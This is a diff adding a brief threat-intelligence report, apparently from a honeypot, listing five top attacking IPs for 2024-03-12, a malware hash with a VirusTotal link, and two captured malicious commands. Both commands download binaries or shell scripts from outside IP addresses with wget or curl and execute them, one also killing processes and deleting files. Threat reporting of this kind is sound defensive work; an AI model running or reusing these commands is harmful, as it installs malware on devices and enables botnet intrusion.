@@ -1,0 +1,17 @@
+Top 5 IPs for 2024-03-12 :
+
+183.215.194.158
+122.226.191.252
+173.225.183.161
+172.208.19.71
+132.147.109.181
+
+Malware Download:
+41a515f4232eedcb1391441aae4b2ab19e590d8d5ac5c3c44ab2d1bf28a175e9
+https://www.virustotal.com/gui/file/41a515f4232eedcb1391441aae4b2ab19e590d8d5ac5c3c44ab2d1bf28a175e9
+
+Malcious Commands seen:
+
+/shell?pkill+-9+arm;pkill+-9+arm7;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.228.37.236/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;wget+http:/\\/103.228.37.236/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;rm+-rf+most*
+
+cd /data/local/tmp/; busybox wget http://14.225.213.142/w.sh; sh w.sh; curl http://14.225.213.142/c.sh; sh c.sh; wget http://14.225.213.142/wget.sh; sh wget.sh; curl http://14.225.213.142/wget.sh; sh wget.sh; busybox wget http://14.225.213.142/wget.sh; sh wget.sh; busybox curl http://14.225.213.142/wget.sh; sh wget.sh
